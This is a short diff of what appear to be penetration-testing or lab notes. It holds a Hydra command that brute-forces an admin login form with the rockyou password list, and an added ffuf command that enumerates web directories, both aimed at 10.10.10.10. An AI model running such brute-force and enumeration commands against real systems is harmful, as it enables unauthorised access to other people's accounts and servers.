@@ -1,2 +1,5 @@
 
 hydra -l admin -P /rockyou.txt 10.10.10.10 http-post-form "/admin/:user=^USER^&pass=^PASS^:F=Username or password invalid" -V -I -t 4
+
+
+ffuf -u http://10.10.10.10/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
